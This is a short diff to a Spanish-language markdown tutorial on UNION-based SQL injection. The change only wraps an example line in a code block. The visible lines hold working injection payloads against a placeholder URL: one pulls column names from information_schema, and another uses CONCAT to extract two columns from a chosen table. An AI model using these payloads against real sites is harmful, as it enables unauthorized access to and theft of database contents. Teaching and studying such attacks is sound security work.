@@ -365,9 +365,9 @@ http://ejemplo.com/product.php?id=1 UNION SELECT 1,column_name,3,4,5 FROM inform
 ## 6️⃣ Mostrar datos concatenados
 
 Esto permite mostrar múltiples columnas en un solo campo visualizado:
-
+```
 http://ejemplo.com/product.php?id=1 UNION SELECT 1,CONCAT(<COLUMNA1>,0x3a,<COLUMNA2>),3,4,5 FROM <NOMBRE_BASE_DATOS>.<NOMBRE_TABLA>-- -
-
+```
 (0x3a representa el carácter ":")
 
 ---
